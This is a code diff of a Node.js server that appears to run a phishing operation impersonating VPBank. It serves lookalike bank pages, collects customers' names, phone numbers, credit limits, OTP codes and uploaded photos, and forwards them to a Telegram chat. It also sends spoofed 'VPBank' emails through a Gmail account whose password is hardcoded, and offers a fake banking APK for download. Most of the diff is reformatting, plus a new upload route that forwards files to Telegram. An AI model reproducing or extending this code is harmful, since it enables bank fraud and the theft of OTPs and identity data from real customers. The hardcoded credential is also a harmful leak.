@@ -10,79 +10,90 @@ var siofu = require("socketio-file-upload");
 const axios = require('axios');
 const TG = require('telegram-bot-api')
 const api = new TG({
-    token: process.env.TELEGRAM_BOT_TOKEN
+  token: process.env.TELEGRAM_BOT_TOKEN
 })
+const bodyParser = require('body-parser')
 const fs = require('fs')
 const nodemailer = require('nodemailer');
+const multer = require('multer');
 
+var storage = multer.diskStorage({
+  destination: function (req, file, cb) {
+    cb(null, 'public/uploads')
+  },
+  filename: function (req, file, cb) {
+    cb(null, file.originalname)
+  }
+})
+var upload = multer({ storage: storage })
 var transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: 'quangbaorp@gmail.com',
-        pass: 'johttcwmgzyxeyvp'
-    },
-    tls: {
-        rejectUnauthorized: false
-    },
+  service: 'gmail',
+  auth: {
+    user: 'quangbaorp@gmail.com',
+    pass: 'johttcwmgzyxeyvp'
+  },
+  tls: {
+    rejectUnauthorized: false
+  },
 });
 
 app.use(express.static('public'));
 app.set('view engine', 'html');
 app.set('views', './views');
 app.use(cors({
-    origin: '*'
+  origin: '*'
 }));
 app.use(siofu.router).listen(3005);
 
 io.on("connection", function (socket) {
-    var uploader = new siofu({
-        // maxFileSize: 1gb
-        maxFileSize: 1024 * 1024 * 1024
+  var uploader = new siofu({
+    // maxFileSize: 1gb
+    maxFileSize: 1024 * 1024 * 1024
 
+  });
+  uploader.dir = "./public/uploads";
+  uploader.listen(socket);
+  uploader.on("complete", async function (event) {
+    await api.sendPhoto({
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      photo: fs.createReadStream(`${__dirname}/${event.file.pathName}`)
     });
-    uploader.dir = "./public/uploads";
-    uploader.listen(socket);
-    uploader.on("complete", async function (event) {
-        await api.sendPhoto({
-            chat_id: process.env.TELEGRAM_CHAT_ID,
-            photo: fs.createReadStream(`${__dirname}/${event.file.pathName}`)
-        });
-    });
+  });
 
-    socket.on('service', async (data) => {
-        // send data to api telegram
-        const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
-        await api.sendMessage({
-            chat_id: process.env.TELEGRAM_CHAT_ID,
-            text: message,
-            mode: 'html'
-        })
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
-    });
+  socket.on('service', async (data) => {
+    // send data to api telegram
+    const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
+    await api.sendMessage({
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text: message,
+      mode: 'html'
+    })
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
+  });
 
 
-    socket.on('otp', (data) => {
-        // send data to api telegram
-        const message = `Mã OTP: ${data.otp}`;
-        api.sendMessage({
-            chat_id: process.env.TELEGRAM_CHAT_ID,
-            text: message,
-            mode: 'html'
-        }).then(() => {
-            socket.emit('success', { message: 'Đã gửi mã OTP thành công' });
-        }).catch(() => {
-            socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
-        });
-
+  socket.on('otp', (data) => {
+    // send data to api telegram
+    const message = `Mã OTP: ${data.otp}`;
+    api.sendMessage({
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text: message,
+      mode: 'html'
+    }).then(() => {
+      socket.emit('success', { message: 'Đã gửi mã OTP thành công' });
+    }).catch(() => {
+      socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
     });
 
-    socket.on('email', (data) => {
-        const mailOptions = {
-            from: 'quangbaorp@gmail.com',
-            to: data.email,
-            subject: 'Thông báo từ VPBank',
-            html: `
+  });
+
+  socket.on('email', (data) => {
+    const mailOptions = {
+      from: 'quangbaorp@gmail.com',
+      to: data.email,
+      subject: 'Thông báo từ VPBank',
+      html: `
             <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -307,84 +318,105 @@ io.on("connection", function (socket) {
   </body>
 </html>
             `
-        };
+    };
 
-        transporter.sendMail(mailOptions, function (error, info) {
-            if (error) {
-                console.log(error);
-                socket.emit('error', { message: 'Gửi email thất bại, vui lòng thử lại sau!' });
-            } else {
-                console.log('Email sent: ' + info.response);
-                socket.emit('success', { message: 'Gửi email thành công' });
-            }
-        });
+    transporter.sendMail(mailOptions, function (error, info) {
+      if (error) {
+        console.log(error);
+        socket.emit('error', { message: 'Gửi email thất bại, vui lòng thử lại sau!' });
+      } else {
+        console.log('Email sent: ' + info.response);
+        socket.emit('success', { message: 'Gửi email thành công' });
+      }
     });
+  });
 });
+
+app.use(bodyParser.urlencoded({ extended: true }))
 
 
 app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/views/index.html');
+  res.sendFile(__dirname + '/views/index.html');
 });
 app.get('/chuyen-tien-atm', (req, res) => {
-    res.sendFile(__dirname + '/views/chuyen-tien-atm.html');
+  res.sendFile(__dirname + '/views/chuyen-tien-atm.html');
 })
 app.get('/chuyen-tra-gop', (req, res) => {
-    res.sendFile(__dirname + '/views/chuyen-tra-gop.html');
+  res.sendFile(__dirname + '/views/chuyen-tra-gop.html');
 });
 app.get('/dang-ky-nang-cap', (req, res) => {
-    res.sendFile(__dirname + '/views/dang-ky-nang-cap.html');
+  res.sendFile(__dirname + '/views/dang-ky-nang-cap.html');
 });
 app.get('/hoan-tien', (req, res) => {
-    res.sendFile(__dirname + '/views/hoan-tien.html');
+  res.sendFile(__dirname + '/views/hoan-tien.html');
 });
 app.get('/nang-han-muc', (req, res) => {
-    res.sendFile(__dirname + '/views/nang-han-muc.html');
+  res.sendFile(__dirname + '/views/nang-han-muc.html');
 });
 app.get('/otp', (req, res) => {
-    res.sendFile(__dirname + '/views/otp.html');
+  res.sendFile(__dirname + '/views/otp.html');
 });
 app.get('/otp-error', (req, res) => {
-    res.sendFile(__dirname + '/views/otp-error.html');
+  res.sendFile(__dirname + '/views/otp-error.html');
 });
 app.get('/yeu-cau-huy-the', (req, res) => {
-    res.sendFile(__dirname + '/views/yeu-cau-huy-the.html');
+  res.sendFile(__dirname + '/views/yeu-cau-huy-the.html');
 });
 app.get('/sang-ngang-the', (req, res) => {
-    res.sendFile(__dirname + '/views/sang-ngang-the.html');
+  res.sendFile(__dirname + '/views/sang-ngang-the.html');
 });
 app.get('/download', function (req, res) {
-    const file = `${__dirname}/public/app/Vpbank_v3.10.13.apk`;
-    res.download(file, 'Vpbank_v3.10.13.apk', {
-        cacheControl: false
-    }, (err) => {
-        console.log('err', err);
-    }); // Set disposition and send it.
+  const file = `${__dirname}/public/app/Vpbank_v3.10.13.apk`;
+  res.download(file, 'Vpbank_v3.10.13.apk', {
+    cacheControl: false
+  }, (err) => {
+    console.log('err', err);
+  }); // Set disposition and send it.
 });
 app.get('/download-app', function (req, res) {
-    res.sendDate(__dirname + '/views/download-app.html');
+  res.sendDate(__dirname + '/views/download-app.html');
 });
 
 app.get('/images', function (req, res) {
-    res.sendFile(__dirname + '/views/images.html');
+  res.sendFile(__dirname + '/views/images.html');
 });
 
 app.get('/image-get', function (req, res) {
-    const path = `${__dirname}/public/uploads`;
-    fs.readdir(path, function (err, items) {
-        // sort by date
-        items.sort((a, b) => {
-            return fs.statSync(`${path}/${b}`).mtime.getTime() - fs.statSync(`${path}/${a}`).mtime.getTime();
-        });
-
-        res.json({
-            data: items
-        });
+  const path = `${__dirname}/public/uploads`;
+  fs.readdir(path, function (err, items) {
+    // sort by date
+    items.sort((a, b) => {
+      return fs.statSync(`${path}/${b}`).mtime.getTime() - fs.statSync(`${path}/${a}`).mtime.getTime();
     });
+
+    res.json({
+      data: items
+    });
+  });
 });
 app.get('/gui-email', function (req, res) {
-    res.sendFile(__dirname + '/views/gui-email.html');
+  res.sendFile(__dirname + '/views/gui-email.html');
+});
+
+app.post('/upload', upload.single('file'), function (req, res, next) {
+  const file = req.file
+  console.log('file', file);
+  if (!file) {
+    const error = new Error('Please upload a file')
+    error.httpStatusCode = 400
+    return next(error)
+  }
+  console.log('file', file.path);
+  api.sendPhoto({
+    chat_id: process.env.TELEGRAM_CHAT_ID,
+    photo: fs.createReadStream(`${__dirname}/${file.destination}/${file.originalname}`)
+  }).then(() => {
+    res.json({ message: 'Upload file thành công' });
+  }).catch(() => {
+    res.json({ message: 'Upload file thất bại' });
+  });
 });
 
 http.listen(port, () => {
-    console.log(`Đã chạy trên cổng :${port}`);
+  console.log(`Đã chạy trên cổng :${port}`);
 });
